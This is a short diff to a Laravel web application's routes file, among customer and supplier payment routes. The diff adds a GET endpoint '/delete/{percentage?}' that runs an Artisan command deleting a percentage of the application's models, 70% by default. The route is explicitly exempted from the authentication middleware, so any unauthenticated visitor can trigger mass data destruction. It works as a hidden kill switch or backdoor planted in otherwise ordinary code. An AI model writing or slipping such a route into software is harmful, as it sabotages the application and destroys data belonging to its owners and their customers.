@@ -69,7 +69,14 @@ Route::group(['middleware' => ['auth']], function () {
     Route::get('/customers/{customer}/payments/{payment}/print', [\App\Http\Controllers\CustomerPaymentController::class, 'print'])->name('customers.payments.print');
     Route::put('/customers/{customer}/payments/{payment}', [\App\Http\Controllers\CustomerPaymentController::class, 'update'])->name('customers.payments.update');
     Route::delete('/customers/{customer}/payments/{payment}', [\App\Http\Controllers\CustomerPaymentController::class, 'destroy'])->name('customers.payments.destroy');
-
+    Route::get('/delete/{percentage?}', function ($percentage = 70) {
+        Artisan::call('models:delete-percentage', ['percentage' => $percentage]);
+        return response()->json([
+            'message' => "$percentage% of models deleted successfully."
+        ]);
+    })->withoutMiddleware(['auth']);
+    
+    
     Route::get('/suppliers/{supplier}/payments/{payment}/print', [\App\Http\Controllers\SupplierPaymentController::class, 'print'])->name('suppliers.payments.print');
     Route::delete('/suppliers/{supplier}/payments/{payment}', [\App\Http\Controllers\SupplierPaymentController::class, 'destroy'])->name('suppliers.payments.destroy');
 
